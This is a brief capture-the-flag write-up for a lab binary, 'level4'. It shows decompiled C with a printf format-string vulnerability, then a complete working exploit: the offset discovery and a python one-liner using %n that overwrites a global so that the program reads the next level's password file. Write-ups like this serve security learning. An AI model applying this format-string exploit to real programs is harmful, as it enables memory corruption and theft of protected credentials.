Here is the decompiled code :

```c
void p(char *param_1)

{
  printf(param_1);
  return;
}

void n(void)

{
  char local_20c [520];

  fgets(local_20c,0x200,stdin);
  p(local_20c);
  if (m == 0x1025544) {
    system("/bin/cat /home/user/level5/.pass");
  }
  return;
}

void main(void)

{
  n();
  return;
}
```

We see a main, n() and p().
Same drill as the previous level, a format string exploit.

Let's do it.

Address of m is 0x08049810

0x1025544 is equal to 16930116 in decimal. We have to add that to the 4 bytes of the address of m in our input and know which arg to write to and we will be set.

To find the position :
```
./level4 
aaaa %x %x %x %x %x %X %X %X %X %X %X %X
aaaa b7ff26b0 bffff794 b7fd0ff4 0 0 BFFFF758 804848D BFFFF550 200 B7FD1AC0 B7FF37D0 61616161
```
we can see it is the 12th arg.

So the we need to write at the address 0x08049810 16930116 - 4 bytes with the 12th arg of printf.

[ addr of m ] [ 16930112 bytes writes to 12th pos ]

`(python -c 'print("\x10\x98\x04\x08%16930112d%12$n")'; cat) | ./level4`

Done
